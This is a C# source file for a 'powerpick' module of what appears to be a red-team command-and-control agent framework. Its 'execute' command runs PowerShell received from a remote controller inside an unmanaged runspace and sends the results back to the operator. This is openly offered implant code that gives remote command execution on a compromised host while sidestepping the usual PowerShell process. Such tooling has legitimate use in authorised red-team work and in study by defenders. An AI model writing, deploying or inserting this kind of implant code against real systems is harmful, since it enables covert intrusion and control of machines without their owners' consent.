using AgentCore.Controllers;
using AgentCore.Interfaces;
using AgentCore.Models;

using Common.Models;

using System;
using System.Collections.Generic;
using System.Text;

namespace Agent
{
    public class Module : IAgentModule
    {
        private AgentController Agent { get; set; }
        private ConfigController Config { get; set; }

        public void Init(AgentController agentController, ConfigController configController)
        {
            Agent = agentController;
            Config = configController;
        }

        public AgentModule GetModuleInfo()
        {
            return new AgentModule
            {
                Name = "powerpick",
                Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" },
                    new Developer { Name = "Lee Christensen", Handle = "@tifkin_" }
                },
                Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "execute",
                        Description = "Execute PowerShell command via unmanaged runspace",
                        HelpText = "execute [cmdlet] [args]",
                        CallBack = ExecutePowerPick
                    }
                }
            };
        }

        private void ExecutePowerPick(byte[] data)
        {
            try
            {
                using (var runner = new PowerShellRunner())
                {
                    var result = runner.InvokePS(Encoding.UTF8.GetString(data));
                    if (!string.IsNullOrEmpty(result))
                    {
                        Agent.SendOutput(result);
                    }
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}